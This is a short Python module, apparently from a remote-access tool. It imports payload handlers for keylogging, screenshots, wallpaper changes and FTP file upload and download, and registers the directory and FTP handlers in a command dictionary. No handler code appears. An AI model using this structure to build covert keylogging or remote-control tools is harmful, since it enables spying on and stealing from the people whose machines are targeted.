from payloads.change_directory_handler import ChangeDirectoryHandler
from payloads.upload_payload_handler import FTPUploadPayloadHandler
from payloads.download_payload_handler import FTPDownloadPayloadHandler
from payloads.change_wallpaper_payload_handler import WindowsWallchangePayloadHandler
from payloads.screenshot_payload_handler import WindowsScreenshotPayloadHandler
from payloads.keylogger_payload_handler import WindowsFileKeyLogPayloadHandler

payload_register={
    "cd":ChangeDirectoryHandler,
    "ftp-upload":FTPUploadPayloadHandler,
    "ftp-download":FTPDownloadPayloadHandler,
}